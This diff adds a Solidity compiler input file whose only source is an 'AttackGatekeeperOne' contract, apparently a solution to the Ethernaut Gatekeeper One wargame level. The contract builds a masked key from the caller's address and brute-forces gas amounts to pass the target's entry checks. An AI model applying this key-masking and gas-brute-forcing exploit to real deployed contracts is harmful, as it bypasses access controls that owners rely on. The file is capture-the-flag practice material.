@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/AttackGatekeeperOne.sol": {
+      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract AttackGatekeeperOne {\r\n  event Hacked(uint256 gasBrute);\r\n\r\n  address owner;\r\n\r\n  constructor(address _owner) public {\r\n    owner = _owner;\r\n  }\r\n\r\n  function attack(address _gatekeeperAddr, uint256 _lowerGasBrute, uint256 _upperGasBrute) external {\r\n    bytes8 key = bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);\r\n    bool success;\r\n    uint256 gasBrute;\r\n\r\n    for (gasBrute = _lowerGasBrute; gasBrute <= _upperGasBrute; gasBrute++) {\r\n      (success, ) = address(_gatekeeperAddr).call{gas:(gasBrute + (8191 * 3))}(abi.encodeWithSignature(\"enter(bytes8)\", key));\r\n        if(success){\r\n            break;\r\n        }\r\n    }\r\n\r\n    require(success, \"HACK FAILED\");\r\n    emit Hacked(gasBrute);\r\n  }\r\n}\r\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
